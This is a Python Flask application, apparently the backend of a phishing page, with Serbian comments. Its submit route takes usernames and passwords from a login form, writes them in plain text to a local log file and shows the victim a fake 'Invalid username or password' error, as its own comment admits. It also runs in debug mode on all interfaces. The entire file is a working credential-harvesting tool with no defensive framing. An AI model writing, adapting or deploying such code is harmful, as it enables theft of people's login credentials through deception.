import os
from flask import Flask, render_template, request

app = Flask(__name__)

# Postavljanje fajla za čuvanje podataka u istom folderu gde je aplikacija
LOG_FILE = os.path.join(os.getcwd(), "log.txt")

def save_to_file(username, password):
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"Username: {username}, Password: {password}\n")

# Početna stranica
@app.route('/')
def index():
    return render_template('index.html', error=False)

# Ruta za prijavu
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        # Čuvanje podataka u fajl
        save_to_file(username, password)
        
        # Prikazivanje lažne greške korisniku
        return render_template('index.html', error=True, message="Invalid username or password. Please try again.")
    
    return render_template('index.html', error=True, message="Please fill in all fields.")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10000, debug=True)
